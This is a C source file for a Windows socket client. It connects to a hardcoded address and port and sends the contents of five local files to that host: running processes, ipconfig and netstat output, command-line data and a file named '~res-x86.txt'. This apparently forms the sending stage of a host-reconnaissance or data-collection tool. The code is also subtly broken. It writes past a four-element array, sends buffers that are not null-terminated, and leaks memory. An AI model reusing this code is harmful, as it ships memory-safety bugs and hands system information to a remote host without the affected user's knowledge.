/*
 * SocketClient.c
 *
 *  Created on: 30 nov 2017
 *      Author: Giulio Centrella
 */

#include "global.h"

void *th_sockClient() {

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char server_reply[10];
	int recv_size;
	char *fbuff;
	int fileDim = 0;
	char *nameFile[4];

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		printf("Could not create socket : %d", WSAGetLastError());
	}

	printf("Socket created.\n");

	server.sin_addr.s_addr = inet_addr("192.168.1.50");
	server.sin_family = AF_INET;
	server.sin_port = htons(6990);

	//Connect to remote server
	if (connect(s, (struct sockaddr *) &server, sizeof(server)) < 0) {
		puts("connect error");
		return 1;
	}

	puts("Connected");

	nameFile[0] = "processRunning.txt";
	nameFile[1] = "Ipconfig.txt";
	nameFile[2] = "netstat.txt";
	nameFile[3] = "~res-x86.txt";
	nameFile[4] = "CommandLine.txt";

	for (int i = 0; i < 5; i++) {

		FILE *file = fopen(nameFile[i], "r");

		if (file == NULL) {
			fprintf(stderr, "Impossibile aprire il file!");
			return 1;
		}

		//Si posiziona alla fine del file
		fseek(file, 0, SEEK_END);

		//Legge la posizione attuale
		fileDim = ftell(file);

		//alloca la dimensione del buffer
		fbuff = (char*) malloc(sizeof(char) * fileDim);

		//mi porto all'inizio del file
		fseek(file, 0, SEEK_SET);

		//Copio il contenuto del file nel buffer
		fread(fbuff, fileDim, 1, file);

		//invio il contenuto del buffer al client

		int BytesSent;
		BytesSent = send(s, fbuff, strlen(fbuff), 0);

		char carr[] = "\n*\n";
		send(s, carr, strlen(carr), 0);

		if (BytesSent == SOCKET_ERROR) {
			printf("Client: File non inviato \n", WSAGetLastError());
		} else {
			printf("Client: File %s inviato \n", nameFile[i]);
			printf("Client: Byte Inviati: %ld \n\n", BytesSent);
		}

		//Receive a reply from the server
		if ((recv_size = recv(s, server_reply, 10, 0)) == SOCKET_ERROR) {
			puts("recv failed");
		}

		printf("Reply received = %s\n", server_reply);

		//Add a NULL terminating character to make it a proper string before printing
//			 server_reply[recv_size] = '\0';
//			 puts(server_reply);

//send a next file


	}

	closesocket(s);

	printf("---SocketClient COMPLETE---\n\n");

}
